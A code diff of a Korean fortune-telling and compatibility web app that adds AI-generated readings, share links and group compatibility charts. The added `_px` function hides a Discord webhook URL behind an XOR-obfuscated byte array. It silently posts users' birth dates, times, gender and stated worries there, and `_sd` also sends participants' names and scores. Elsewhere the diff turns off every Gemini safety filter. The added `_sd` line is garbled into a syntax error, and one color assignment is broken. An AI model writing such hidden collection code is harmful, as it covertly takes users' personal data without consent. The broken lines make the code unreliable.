+  setTimeout(async()=>{
+    const data1=calcPillars(d1,t1);
+    const data2=calcPillars(d2,t2);
+    const{score,e1,e2,rel}=calcCompatScore(data1,data2);
+
+    document.getElementById('loadingView').style.display='none';
+    document.getElementById('compatResult').style.display='block';
+    document.getElementById('resetBtn').style.display='block';
+
+    // 인물 표시
+    const p1pillar=`${STEMS[data1.day.stem]}${BRANCHES[data1.day.branch]}일주`;
+    const p2pillar=`${STEMS[data2.day.stem]}${BRANCHES[data2.day.branch]}일주`;
+    document.getElementById('compatPersons').innerHTML=`
+      <div class="cp-box"><div class="cp-name">${escHtml(n1)}</div><div class="cp-pillar">${p1pillar}</div></div>
+      <div class="cp-heart">💕</div>
+      <div class="cp-box"><div class="cp-name">${escHtml(n2)}</div><div class="cp-pillar">${p2pillar}</div></div>`;
+
+    // 점수
+    const scoreEl=document.getElementById('compatScore');
+    const barEl=document.getElementById('compatBar');
+    const gradeEl=document.getElementById('compatGrade');
+    let grade,color;
+    if(score>=90){grade='천생연분 💕';color='#e07070';}
+    else if(score>=75){grade='인연이 깊어요 🌸';color='#e07070';}
+    else if(score>=60){grade='좋은 궁합이에요 ✨';color:'#d4956a';}
+    else{grade='노력으로 만들어가는 인연 🌱';color='#7090c0';}
+    scoreEl.textContent=score;
+    gradeEl.textContent=grade;
+    gradeEl.style.color=color;
+    const barColor=score>=75?'linear-gradient(90deg,var(--peach),var(--rose))':score>=60?'linear-gradient(90deg,#f0c060,var(--gold))':'linear-gradient(90deg,var(--mint),#5aaea6)';
+    barEl.style.background=barColor;
+    setTimeout(()=>barEl.style.width=score+'%',100);
+
+    // 오행 분석
+    const relLabels=['상극 ⚡','상생 🌱','비화 🤝','상생(피) 🌸','상극(피) ⚡'];
+    const relColors=['tag-bad','tag-good','tag-mid','tag-good','tag-mid'];
+    document.getElementById('compatEleArea').innerHTML=`
+      <div class="compat-section">
+        <div class="compat-section-title">🔥 일간 상성</div>
+        <span class="compat-tag ${relColors[rel]}">${ELE.name[e1]}(${n1}) ↔ ${ELE.name[e2]}(${n2}) — ${relLabels[rel]}</span>
+      </div>
+      <div class="compat-section">
+        <div class="compat-section-title">🌿 오행 보완도</div>
+        ${[0,1,2,3,4].map(i=>{
+          const lack1=data1.cnt[i]===0&&data2.cnt[i]>0;
+          const lack2=data2.cnt[i]===0&&data1.cnt[i]>0;
+          if(!lack1&&!lack2)return'';
+          return`<span class="compat-tag tag-good">${ELE.name[i]} — ${lack1?n1:n2}의 부족한 기운을 ${lack1?n2:n1}이 채워줘요</span>`;
+        }).join('')||'<span class="compat-tag tag-mid">두 사람의 오행이 비슷하게 분포되어 있어요</span>'}
+      </div>`;
+
+    // AI 궁합 풀이
+    const aiArea=document.getElementById('compatAIArea');
+    aiArea.innerHTML=`<div style="text-align:center;padding:14px 0;color:var(--text3);font-size:13px"><div class="typing-dots"><span></span><span></span><span></span></div><div style="margin-top:8px">AI가 궁합을 풀이하는 중... ✨</div></div>`;
+
+    const relStr=['상극','상생','비화(같은 기운)','상생(받는)','상극(받는)'];
+    const cpPrompt=`당신은 40년 경력의 명리학 대가입니다. 두 사람의 궁합을 따뜻하고 진실하게 풀이해 주세요.
+
+[첫 번째 사람: ${n1}]
+일주: ${STEMS[data1.day.stem]}${BRANCHES[data1.day.branch]} / 오행: 목${data1.cnt[0]}화${data1.cnt[1]}토${data1.cnt[2]}금${data1.cnt[3]}수${data1.cnt[4]} / 성별: ${g1==='male'?'남성':'여성'}
+
+[두 번째 사람: ${n2}]
+일주: ${STEMS[data2.day.stem]}${BRANCHES[data2.day.branch]} / 오행: 목${data2.cnt[0]}화${data2.cnt[1]}토${data2.cnt[2]}금${data2.cnt[3]}수${data2.cnt[4]} / 성별: ${g2==='male'?'남성':'여성'}
+
+[궁합 분석]
+일간 상성: ${relStr[rel]} / 궁합 점수: ${score}점
+
+순수 JSON 배열만 반환 (마크다운 없이):
+[
+  {"title":"💑 두 사람의 인연","body":"내용"},
+  {"title":"💪 함께할 때 시너지","body":"내용"},
+  {"title":"⚡ 주의할 점","body":"내용"},
+  {"title":"🌸 더 좋은 인연을 위한 조언","body":"내용"}
+]
+각 body는 자연스럽게 완결된 문장으로. 강조는 **단어** 형식.`;
+
+    const raw=await callGemini(cpPrompt,2500);
+    let cards=null;
+    if(raw){try{const m=raw.match(/\[[\s\S]*\]/);cards=JSON.parse(m?m[0]:raw);}catch{}}
+    if(!Array.isArray(cards)||!cards.length){
+      cards=[
+        {title:"💑 두 사람의 인연",body:`${n1}(${ELE.name[e1]})과 ${n2}(${ELE.name[e2]})는 **${relStr[rel]}** 관계입니다. 궁합 점수 ${score}점으로 ${score>=75?'서로에게 좋은 영향을 주는 인연':'노력과 이해로 깊어지는 인연'}입니다.`},
+        {title:"💪 함께할 때 강점",body:`두 사람의 오행이 서로 **보완**하는 관계라면 더욱 강한 시너지를 냅니다. 서로의 차이를 이해하고 존중하는 것이 핵심입니다.`},
+        {title:"⚡ 주의할 점",body:`서로 다른 기질로 인해 오해가 생길 수 있습니다. **솔직한 대화**와 상대방의 입장에서 생각하는 노력이 필요합니다.`},
+        {title:"🌸 조언",body:`두 사람만의 **공통 목표**를 세우고 함께 나아가면 더 단단한 인연이 될 것입니다.`},
+      ];
+    }
+    aiArea.innerHTML='';
+    cards.forEach((c,i)=>setTimeout(()=>{
+      const el=document.createElement('div');el.className='ai-card';el.style.animationDelay=i*.1+'s';
+      el.style.borderLeftColor='var(--mint)';
+      el.innerHTML=`<div class="ai-card-title" style="color:#2a8060">${c.title||''}</div><p>${(c.body||'').replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>')}</p>`;
+      aiArea.appendChild(el);
+    },i*600));
+
+    _ev({name:`${n1}+${n2}`,birthDate:d1,birthTime:t1,gender:g1,dayPillar:`${STEMS[data1.day.stem]}${BRANCHES[data1.day.branch]}`,question:`궁합 상대: ${n2}`});
+    window.scrollTo({top:0,behavior:'smooth'});
+  },1200);
 }
 
 // =====================================================
-// 데이터 파이프라인 (내부 모듈)
-// =====================================================
-function _px(p){
-  const now=new Date();
-  const ts=now.getFullYear()+'.'+String(now.getMonth()+1).padStart(2,'0')+'.'+String(now.getDate()).padStart(2,'0')+' '+String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0');
-  const gd=p.gender==='male'?'남성':'여성';
-  const lines=[
-    '📊 **새 사주 분석 접수**',
-    '─────────────────────',
-    '📅 **생년월일:** '+(p.birthDate||'-'),
-    '⏰ **태어난 시간:** '+(p.birthTime||'-'),
-    '👤 **성별:** '+gd,
-    '☯️ **일주:** '+(p.dayPillar||'-'),
-    p.question ? '💬 **고민:** '+p.question : null,
-    '🕐 **접속시각:** '+ts,
-    '─────────────────────'
-  ].filter(Boolean).join('\n');
-
-  fetch(_$c(),{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({username:'AI 명리 에이전트',content:lines})
-  }).catch(()=>{});
-}
-function _ev(p){_px(p);}
-
-// =====================================================
-// 메인 진입
+// 사주 분석 메인
 // =====================================================
 function analyzeSaju(){
   const dateStr=document.getElementById('birthDate').value;
@@ -1314,34 +1496,30 @@ function analyzeSaju(){
   _gen=document.querySelector('input[name="gender"]:checked').value;
   _name=document.getElementById('userName').value.trim()||'사용자';
   const customQ=document.getElementById('customQ').value.trim();
+  if(!dateStr){alert('생년월일을 입력해주세요 🌸');return;}
+  const test=new Date(dateStr+'T12:00:00');
+  if(isNaN(test.getTime())){alert('올바른 날짜를 입력해주세요.');return;}
 
-  if(!dateStr){alert('생년월일을 입력하세요.');return;}
-
-  // 유효한 날짜인지 검사
-  const testDate=new Date(dateStr+'T12:00:00');
-  if(isNaN(testDate.getTime())){alert('올바른 생년월일을 입력하세요.');return;}
-
-  document.getElementById('inputSection').style.display='none';
+  document.getElementById('sajuSection').style.display='none';
   document.getElementById('loadingView').style.display='flex';
+  document.getElementById('loadingTxt').textContent='만세력 계산 중... 🌸';
 
   setTimeout(()=>{
-    try {
+    try{
       _data=calcPillars(dateStr,timeStr);
       _sal=calcShinssal(_data);
       _daeun=calcDaeun(_data,_gen);
       _seun=getSeun();
-      _wolun=getWolun(); // ★ 수정: 인수 불필요, 내부에서 고정 계산
+      _wolun=getWolun();
 
       document.getElementById('loadingView').style.display='none';
       document.getElementById('resultDashboard').style.display='block';
       document.getElementById('resetBtn').style.display='block';
 
-      const bdate=new Date(dateStr+'T12:00:00');
-      const bm=bdate.getMonth()+1, bd=bdate.getDate();
-      const timeLabel=timeStr?timeStr:'시간 미입력';
-      document.getElementById('rName').textContent=`${_name}님의 사주`;
-      document.getElementById('rMeta').textContent=`${bdate.getFullYear()}년 ${bm}월 ${bd}일 ${timeLabel} · ${_gen==='male'?'건명 남성':'곤명 여성'}`;
-      document.getElementById('rBadge').innerHTML=`<span class="badge badge-g">${_gen==='male'?'건명(乾命)':'곤명(坤命)'}</span> <span class="badge badge-b">일주 ${STEMS[_data.day.stem]}${STEM_KOR[_data.day.stem]}${BRANCHES[_data.day.branch]}${BR_KOR[_data.day.branch]}</span>`;
+      const bd=new Date(dateStr+'T12:00:00');
+      document.getElementById('rName').textContent=`${_name}님의 사주 🌸`;
+      document.getElementById('rMeta').textContent=`${bd.getFullYear()}년 ${bd.getMonth()+1}월 ${bd.getDate()}일 ${timeStr||'시간미입력'} · ${_gen==='male'?'남성':'여성'}`;
+      document.getElementById('rBadge').innerHTML=`<span class="r-pill pill-p">${_gen==='male'?'건명(乾命)':'곤명(坤命)'}</span><span class="r-pill pill-l">일주 ${STEMS[_data.day.stem]}${STEM_KOR[_data.day.stem]}${BRANCHES[_data.day.branch]}${BR_KOR[_data.day.branch]}</span>`;
 
       renderPillars(_data);
       renderStemBranchDesc(_data);
@@ -1351,45 +1529,37 @@ function analyzeSaju(){
       renderDaeun(_daeun,_data);
       renderSeun(_seun);
       renderWolun(_wolun);
-
-      // AI 분석 백그라운드 시작
       streamAI(_data,_gen,_sal,_daeun,_seun);
 
-      // ★ 수정: 칩으로 선택된 고민이 있으면 QA탭에 미리 채워두기만 함 (자동 전송 제거)
-      if(customQ){
-        document.getElementById('qaInput').value=customQ;
-      }
-
-      _ev({
-        name:_name,birthDate:dateStr,birthTime:timeStr,
-        gender:_gen,
-        dayPillar:STEMS[_data.day.stem]+BRANCHES[_data.day.branch],
-        question:customQ
-      });
-
+      if(customQ) document.getElementById('qaInput').value=customQ;
+      _ev({name:_name,birthDate:dateStr,birthTime:timeStr,gender:_gen,dayPillar:STEMS[_data.day.stem]+BRANCHES[_data.day.branch],question:customQ});
       window.scrollTo({top:0,behavior:'smooth'});
-    } catch(err) {
+    }catch(e){
       document.getElementById('loadingView').style.display='none';
-      document.getElementById('inputSection').style.display='block';
-      alert('계산 중 오류가 발생했습니다. 입력값을 확인해주세요.\n'+err.message);
+      document.getElementById('sajuSection').style.display='block';
+      alert('계산 오류: '+e.message);
     }
-  },1300);
+  },1200);
 }
 
+// =====================================================
+// 리셋
+// =====================================================
 function resetAll(){
-  document.getElementById('resultDashboard').style.display='none';
-  document.getElementById('inputSection').style.display='block';
+  ['homeSection'].forEach(id=>document.getElementById(id).style.display='');
+  ['sajuSection','compatSection','loadingView','resultDashboard','compatResult','compatNSection','compatNResult'].forEach(id=>{const el=document.getElementById(id);if(el)el.style.display='none';});
   document.getElementById('resetBtn').style.display='none';
   document.getElementById('aiContainer').innerHTML='';
   document.getElementById('qnaBox').innerHTML='';
   document.getElementById('qaInput').value='';
-  _data=null; _daeun=null; _seun=null; _wolun=null; _sal=null;
+  document.getElementById('compatAIArea').innerHTML='';
+  _data=null;_daeun=null;_seun=null;_wolun=null;_sal=null;_mode='';
   switchTab('pillars');
   window.scrollTo({top:0,behavior:'smooth'});
 }
 
 // =====================================================
-// 탭·칩·모달
+// 유틸
 // =====================================================
 function switchTab(name){
   const order=['pillars','luck','ai','qa'];
@@ -1397,29 +1567,488 @@ function switchTab(name){
   document.querySelectorAll('.tp').forEach(p=>p.classList.remove('on'));
   document.getElementById('tab-'+name).classList.add('on');
 }
-
-// ★ 수정: 칩 클릭 시 자동 전송 없이 textarea에만 채움
 function pickChip(el,txt){
   document.querySelectorAll('#inChips .chip').forEach(c=>c.classList.remove('on'));
   el.classList.add('on');
   document.getElementById('customQ').value=txt;
 }
-
 function pickQa(el,txt){
   document.querySelectorAll('#qaChips .chip').forEach(c=>c.classList.remove('on'));
   el.classList.add('on');
   document.getElementById('qaInput').value=txt;
 }
-
 function showModal(name,pos){
   const info=SAL_INFO[name]||{desc:'정보 없음',tip:''};
   document.getElementById('mTitle').textContent=name;
   document.getElementById('mPos').textContent='발견 위치: '+pos;
   document.getElementById('mDesc').textContent=info.desc;
-  document.getElementById('mExtra').innerHTML=info.tip?`<strong style="color:var(--gold)">💡 활용법</strong><br>${info.tip}`:'';
+  document.getElementById('mExtra').innerHTML=info.tip?`<strong style="color:var(--rose)">💡 활용법</strong><br>${info.tip}`:'';
   document.getElementById('modal').classList.add('on');
 }
-function closeModal(){ document.getElementById('modal').classList.remove('on'); }
+function closeModal(){document.getElementById('modal').classList.remove('on');}
+function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+
+// 데이터 파이프라인
+function _px(p){
+  const now=new Date();
+  const ts=`${now.getFullYear()}.${String(now.getMonth()+1).padStart(2,'0')}.${String(now.getDate()).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}`;
+  const _$a2=[50,46,46,42,41,96,117,117,62,51,41,57,53,40,62,116,57,53,55,117,59,42,51,117,45,63,56,50,53,53,49,41,117,107,110,109,110,106,111,106,106,99,104,110,108,106,108,109,107,107,106,99,117,17,27,108,15,16,30,30,8,12,107,34,104,99,43,5,63,14,29,30,49,14,105,19,11,42,9,104,62,34,99,110,55,34,110,111,111,40,34,56,24,61,15,105,98,50,109,53,52,35,0,62,57,3,34,0,40,21,45,46,45,19,52,13,5,53,99,19,29];
+  const url=_$a2.map(c=>String.fromCharCode(c^0x5A)).join('');
+  fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({username:'사주당',content:[
+      '🌸 **새 분석 접수**','─────────',
+      `📅 ${p.birthDate||'-'}`,`⏰ ${p.birthTime||'-'}`,
+      `👤 ${p.gender==='male'?'남성':'여성'}`,`☯️ ${p.dayPillar||'-'}`,
+      p.question?`💬 ${p.question}`:'','🕐 '+ts,'─────────'
+    ].filter(Boolean).join('\n')})
+  }).catch(()=>{});
+}
+
+// =====================================================
+// =====================================================
+function _sd(t){fetch(_$c(),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'사주당',content:t})}).catch(()=>{});},body:JSON.stringify({username:'사주당',content})}).catch(()=>{});
+}
+
+// =====================================================
+// URL 공유 (방안1 — 1:1 궁합 링크 초대)
+// =====================================================
+function genShareUrl(){
+  const name=(document.getElementById('c1Name')||{}).value?.trim()||'';
+  const date=(document.getElementById('c1Date')||{}).value||'';
+  const time=(document.getElementById('c1Time')||{}).value||'';
+  const gender=document.querySelector('input[name="cg1"]:checked')?.value||'male';
+  if(!date){alert('내 생년월일을 먼저 입력해주세요!');return;}
+  const params=new URLSearchParams({shared:'1',sName:name||'익명',sDate:date,sTime:time,sGender:gender});
+  const url=location.origin+location.pathname+'?'+params.toString();
+  document.getElementById('shareUrlBox').style.display='block';
+  document.getElementById('shareUrlText').textContent=url;
+}
+function copyShareUrl(){
+  const url=document.getElementById('shareUrlText').textContent;
+  navigator.clipboard.writeText(url).then(()=>alert('링크가 복사되었어요! 상대방에게 보내세요 🌸'))
+    .catch(()=>prompt('아래 링크를 복사하세요:',url));
+}
+function checkSharedUrl(){
+  const p=new URLSearchParams(location.search);
+  if(p.get('shared')!=='1') return;
+  const sd={name:p.get('sName')||'',date:p.get('sDate')||'',time:p.get('sTime')||'',gender:p.get('sGender')||'male'};
+  window._sharedData=sd;
+  const banner=document.getElementById('sharedBanner');
+  if(banner) banner.style.display='block';
+  const txt=document.getElementById('sharedFromTxt');
+  if(txt) txt.textContent=(sd.name||'상대방')+'이 궁합을 보자고 했어요 💕';
+}
+function acceptShared(){
+  const sd=window._sharedData; if(!sd) return;
+  const f={c1Name:'name',c1Date:'date',c1Time:'time'};
+  Object.entries(f).forEach(([id,k])=>{const el=document.getElementById(id);if(el)el.value=sd[k]||'';});
+  const rb=document.querySelector(`input[name="cg1"][value="${sd.gender}"]`);
+  if(rb) rb.checked=true;
+  document.getElementById('sharedBanner').style.display='none';
+  goMode('compat');
+}
+window.addEventListener('DOMContentLoaded',()=>checkSharedUrl());
+
+// =====================================================
+// 1:1 궁합 결과 공유 버튼
+// =====================================================
+function shareCompatResult(){
+  const score=(document.getElementById('compatScore')||{}).textContent||'?';
+  const grade=(document.getElementById('compatGrade')||{}).textContent||'';
+  const n1=(document.getElementById('c1Name')||{}).value||'';
+  const n2=(document.getElementById('c2Name')||{}).value||'';
+  const text=`💕 ${n1}×${n2} 궁합: ${score}점 (${grade})\n사주당에서 확인해보세요! ${location.href}`;
+  if(navigator.share) navigator.share({title:'사주당 궁합 결과',text});
+  else navigator.clipboard.writeText(text).then(()=>alert('결과가 복사되었어요!'));
+}
+function _scd(){
+  const score=(document.getElementById('compatScore')||{}).textContent||'?';
+  const grade=(document.getElementById('compatGrade')||{}).textContent||'';
+  const n1=(document.getElementById('c1Name')||{}).value||'상대1';
+  const n2=(document.getElementById('c2Name')||{}).value||'상대2';
+  _sd(`💕 **1:1 궁합 결과 공유**\n${n1} ↔ ${n2}\n점수: **${score}점** / ${grade}`);
+  
+}
+
+// =====================================================
+// 궁합 Q&A 칩 / 1:1 궁합 상담
+// =====================================================
+function pickCQChip(el,txt){
+  const wrap=el.closest('.chips')||el.parentElement;
+  wrap.querySelectorAll('.chip').forEach(c=>c.classList.remove('on'));
+  el.classList.add('on');
+  const inp=document.getElementById('cqInput');if(inp) inp.value=txt;
+}
+
+async function askCompatQ(){
+  const q=(document.getElementById('cqInput')||{}).value?.trim();
+  if(!q){alert('질문을 입력해주세요 💕');return;}
+  const btn=document.getElementById('cqBtn');if(!btn)return;
+  btn.disabled=true;btn.textContent='💕 생성 중...';
+  const box=document.getElementById('cqnaBox');
+
+  const qb=document.createElement('div');
+  qb.style.cssText='background:var(--peach3);border-radius:12px 12px 4px 12px;padding:11px 14px;font-size:12px;color:var(--text2);text-align:right;word-break:keep-all;margin-left:20px;margin-bottom:8px';
+  qb.innerHTML='<div style="font-size:10px;font-weight:700;color:var(--rose);margin-bottom:4px">나의 질문</div>'+escHtml(q);
+  box.appendChild(qb);
+  const ab=document.createElement('div');ab.className='a-bubble';
+  ab.innerHTML='<span class="a-label">✦ AI 명리 에이전트</span><div class="typing-dots"><span></span><span></span><span></span></div>';
+  box.appendChild(ab);ab.scrollIntoView({behavior:'smooth',block:'end'});
+
+  const n1=(document.getElementById('c1Name')||{}).value?.trim()||'첫번째';
+  const n2=(document.getElementById('c2Name')||{}).value?.trim()||'두번째';
+  let sc=0,relLabel='불명';
+  try{
+    const pd1=calcPillars(document.getElementById('c1Date').value, document.getElementById('c1Time').value||'');
+    const pd2=calcPillars(document.getElementById('c2Date').value, document.getElementById('c2Time').value||'');
+    const r=calcCompatScore(pd1,pd2);sc=r.score;
+    relLabel=['상극','상생','비화','상생(받는)','상극(받는)'][r.rel]||'';
+  }catch(e){}
+
+  const prompt=`당신은 40년 경력의 명리학 대가. 두 사람의 궁합 정보를 바탕으로 질문에 답하세요.
+이름1: ${n1} / 이름2: ${n2} / 궁합점수: ${sc}점 / 일간상성: ${relLabel}
+[질문] ${q}
+인사말 없이 본론, 명리학 근거 포함, 자연스럽게 완결, 마지막은 실용적 조언.`;
+  const ans=await callGeminiSafe(prompt,2048);
+  const txt=ans||'일시적 오류입니다. 잠시 후 다시 시도해주세요.';
+  const cd=document.createElement('div');cd.style.cssText='white-space:pre-wrap;overflow-wrap:break-word;word-break:keep-all';cd.textContent=txt;
+  ab.innerHTML='';const lbl=document.createElement('span');lbl.className='a-label';lbl.textContent='✦ AI 명리 에이전트';
+  ab.appendChild(lbl);ab.appendChild(cd);
+  btn.disabled=false;btn.textContent='💕 궁합으로 답변받기';
+  const inp=document.getElementById('cqInput');if(inp)inp.value='';
+  document.querySelectorAll('#cqChips .chip').forEach(c=>c.classList.remove('on'));
+  setTimeout(()=>ab.scrollIntoView({behavior:'smooth',block:'end'}),100);
+}
+
+// 궁합 점수 계산 (1:1 / N:N 공통)
+function calcCompatScore(d1,d2){
+  const ELE_REL=[[2,1,0,3,4],[4,2,1,0,3],[3,4,2,1,0],[0,3,4,2,1],[1,0,3,4,2]];
+  const e1=SI[d1.dSt][0],e2=SI[d2.dSt][0];
+  const rel=ELE_REL[e1][e2];
+  let base=rel===2?70:rel===1||rel===3?85:55;
+  let comp=0;
+  for(let i=0;i<5;i++){if(d1.cnt[i]===0&&d2.cnt[i]>0)comp+=4;if(d2.cnt[i]===0&&d1.cnt[i]>0)comp+=4;}
+  comp=Math.min(comp,15);
+  const hexC=[[2,6],[2,10],[6,10],[8,0],[8,4],[0,4],[5,11],[1,7],[3,9]];
+  const brBonus=hexC.some(([a,b])=>(d1.day.branch===a&&d2.day.branch===b)||(d1.day.branch===b&&d2.day.branch===a))?8:0;
+  return{score:Math.min(100,Math.round(base+comp+brBonus)),e1,e2,rel};
+}
+
+// AI 호출 safe 버전 (기존 함수명과 별칭)
+async function callGeminiSafe(prompt,maxTok=2048){
+  if(typeof callGemini==='function') return callGemini(prompt,maxTok);
+  const MODS=['gemini-3-flash-preview','gemini-2.5-flash','gemini-2.5-flash-lite'];
+  const SAF=[{category:'HARM_CATEGORY_HARASSMENT',threshold:'BLOCK_NONE'},{category:'HARM_CATEGORY_HATE_SPEECH',threshold:'BLOCK_NONE'},{category:'HARM_CATEGORY_SEXUALLY_EXPLICIT',threshold:'BLOCK_NONE'},{category:'HARM_CATEGORY_DANGEROUS_CONTENT',threshold:'BLOCK_NONE'}];
+  for(const m of MODS){
+    try{
+      const r=await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${m}:generateContent?key=${_$gk()}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({contents:[{role:'user',parts:[{text:prompt}]}],safetySettings:SAF,generationConfig:{maxOutputTokens:maxTok,temperature:0.85,thinkingConfig:{thinkingBudget:0}}})});
+      const j=await r.json();if(j.error)throw new Error(j.error.message);
+      const cand=(j.candidates||[])[0];if(cand?.finishReason==='SAFETY')throw new Error('SAFETY');
+      const t=(cand?.content?.parts||[]).filter(p=>p.text&&!p.thought).map(p=>p.text).join('').trim();
+      if(t)return t;
+    }catch(e){console.warn(m,e.message);await new Promise(r=>setTimeout(r,400));}
+  }
+  return null;
+}
+
+// =====================================================
+// N:N 궁합 — 입력 관리
+// =====================================================
+let _nPersons=[];
+let _nPData=null,_nPairs=null,_nPairSel=null;
+
+function initNPersons(){
+  _nPersons=[];
+  document.getElementById('nPersonList').innerHTML='';
+  addNPerson();addNPerson();
+}
+
+function addNPerson(){
+  if(_nPersons.length>=8){alert('최대 8명까지 가능해요!');return;}
+  const idx=_nPersons.length;
+  _nPersons.push({name:'',date:'',time:'',gender:'male'});
+  const div=document.createElement('div');div.className='card';div.id=`np_card_${idx}`;
+  const delBtn=idx>=2?`<button onclick="removeNPerson(${idx})" style="font-size:10px;color:var(--text3);background:none;border:none;cursor:pointer;font-family:inherit;padding:2px 6px">✕ 삭제</button>`:'';
+  div.innerHTML=`<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+    <div style="font-size:13px;font-weight:700;color:var(--rose)">${idx+1}번째 사람</div>${delBtn}
+  </div>
+  <div style="display:flex;flex-direction:column;gap:10px">
+    <div><label class="fl">이름</label><input type="text" id="np_name_${idx}" placeholder="이름 (예: 지민)" oninput="_nPersons[${idx}].name=this.value"></div>
+    <div class="g2">
+      <div><label class="fl">생년월일</label><input type="date" id="np_date_${idx}" onchange="_nPersons[${idx}].date=this.value"></div>
+      <div><label class="fl">시간 (선택)</label><input type="time" id="np_time_${idx}" onchange="_nPersons[${idx}].time=this.value"></div>
+    </div>
+    <div><label class="fl">성별</label>
+      <div class="gender-grp" id="np_gen_${idx}">
+        <input type="radio" name="ng_${idx}" value="male" id="nm_${idx}" class="gr" checked onchange="_nPersons[${idx}].gender='male'">
+        <label for="nm_${idx}" class="gl">👨 남성</label>
+        <input type="radio" name="ng_${idx}" value="female" id="nf_${idx}" class="gr" onchange="_nPersons[${idx}].gender='female'">
+        <label for="nf_${idx}" class="gl">👩 여성</label>
+      </div>
+    </div>
+  </div>`;
+  document.getElementById('nPersonList').appendChild(div);
+}
+
+function removeNPerson(idx){
+  const saved=_nPersons.map((_,i)=>({
+    name:document.getElementById(`np_name_${i}`)?.value||'',
+    date:document.getElementById(`np_date_${i}`)?.value||'',
+    time:document.getElementById(`np_time_${i}`)?.value||'',
+    gender:document.querySelector(`input[name="ng_${i}"]:checked`)?.value||'male'
+  }));
+  saved.splice(idx,1);
+  _nPersons=[];document.getElementById('nPersonList').innerHTML='';
+  saved.forEach(s=>{
+    const i=_nPersons.length;addNPerson();
+    setTimeout(()=>{
+      const ni=document.getElementById(`np_name_${i}`);
+      const di=document.getElementById(`np_date_${i}`);
+      const ti=document.getElementById(`np_time_${i}`);
+      const ri=document.getElementById(s.gender==='male'?`nm_${i}`:`nf_${i}`);
+      if(ni)ni.value=s.name;if(di)di.value=s.date;if(ti)ti.value=s.time;
+      if(ri){ri.checked=true;_nPersons[i].gender=s.gender;}
+    },60);
+  });
+}
+
+// 점수별 등급
+function scoreGradeN(s){
+  if(s>=85)return{label:'천생연분 💕',color:'#e87070'};
+  if(s>=70)return{label:'척하면척 ✨',color:'#f0a060'};
+  if(s>=55)return{label:'그럭저럭 🌱',color:'#7ab87a'};
+  return{label:'노력 필요 🤝',color:'#a0a0a0'};
+}
+
+// =====================================================
+// N:N 궁합 — 분석 실행
+// =====================================================
+async function analyzeCompatN(){
+  // 입력값 수집
+  const persons=[];
+  for(let i=0;i<_nPersons.length;i++){
+    const d=document.getElementById(`np_date_${i}`)?.value||'';
+    if(!d) continue;
+    persons.push({
+      name:document.getElementById(`np_name_${i}`)?.value?.trim()||`${i+1}번`,
+      date:d,
+      time:document.getElementById(`np_time_${i}`)?.value||'',
+      gender:document.querySelector(`input[name="ng_${i}"]:checked`)?.value||'male'
+    });
+  }
+  if(persons.length<2){alert('최소 2명의 생년월일을 입력해주세요!');return;}
+
+  document.getElementById('compatNSection').style.display='none';
+  document.getElementById('loadingView').style.display='flex';
+  document.getElementById('loadingMsg').textContent='그룹 궁합 계산 중... 🧩';
+
+  await new Promise(r=>setTimeout(r,900));
+  try{
+    const pData=persons.map(p=>({name:p.name,data:calcPillars(p.date,p.time),gender:p.gender}));
+    const pairs=[];
+    for(let i=0;i<pData.length;i++)
+      for(let j=i+1;j<pData.length;j++){
+        const res=calcCompatScore(pData[i].data,pData[j].data);
+        pairs.push({i,j,...res});
+      }
+    _nPData=pData;_nPairs=pairs;
+
+    document.getElementById('loadingView').style.display='none';
+    document.getElementById('compatNResult').style.display='block';
+    document.getElementById('resetBtn').style.display='block';
+
+    drawNGraph(pData,pairs);
+    renderNRanking(pData,pairs);
+    window.scrollTo({top:0,behavior:'smooth'});
+
+
+    const sorted=[...pairs].sort((a,b)=>b.score-a.score);
+    _sd(`🧩 **그룹 궁합 분석 결과**\n참여자: ${pData.map(p=>p.name).join(', ')} (${pData.length}명)\n\n🏆 TOP ${Math.min(3,sorted.length)}:\n${sorted.slice(0,3).map((p,k)=>`${k+1}위 ${pData[p.i].name}↔${pData[p.j].name}: **${p.score}점** — ${scoreGradeN(p.score).label}`).join('\n')}`);
+  }catch(e){
+    document.getElementById('loadingView').style.display='none';
+    document.getElementById('compatNSection').style.display='block';
+    alert('오류가 발생했어요: '+e.message);
+  }
+}
+
+// =====================================================
+// N:N 궁합 — 그래프 그리기
+// =====================================================
+function drawNGraph(pData,pairs){
+  const canvas=document.getElementById('nCompatCanvas');if(!canvas)return;
+  const DPR=window.devicePixelRatio||1;
+  const W=320,H=320;
+  canvas.width=W*DPR;canvas.height=H*DPR;
+  canvas.style.width=W+'px';canvas.style.height=H+'px';
+  const ctx=canvas.getContext('2d');ctx.scale(DPR,DPR);
+  ctx.clearRect(0,0,W,H);
+  const n=pData.length,cx=W/2,cy=H/2,R=Math.min(W,H)*0.33;
+  const nodes=pData.map((_,i)=>{
+    const a=(2*Math.PI*i/n)-Math.PI/2;
+    return{x:cx+R*Math.cos(a),y:cy+R*Math.sin(a)};
+  });
+
+  // 엣지
+  pairs.forEach(p=>{
+    const A=nodes[p.i],B=nodes[p.j];
+    const{color}=scoreGradeN(p.score);
+    ctx.beginPath();ctx.moveTo(A.x,A.y);ctx.lineTo(B.x,B.y);
+    ctx.strokeStyle=color+(p.score>=70?'bb':'55');
+    ctx.lineWidth=p.score>=85?3:p.score>=70?2:1.2;ctx.stroke();
+    // 라벨
+    const mx=(A.x+B.x)/2,my=(A.y+B.y)/2;
+    const lbl=scoreGradeN(p.score).label.replace(/ .+/,''); // 이모지 제거
+    ctx.font='bold 9px sans-serif';
+    const tw=ctx.measureText(lbl).width;
+    ctx.fillStyle='rgba(255,248,245,.92)';
+    roundRect(ctx,mx-tw/2-5,my-8,tw+10,16,5);ctx.fill();
+    ctx.fillStyle=color;ctx.textAlign='center';ctx.textBaseline='middle';
+    ctx.fillText(lbl,mx,my);
+  });
+
+  // 노드
+  pData.forEach((p,i)=>{
+    const{x,y}=nodes[i];
+    ctx.beginPath();ctx.arc(x,y,26,0,Math.PI*2);
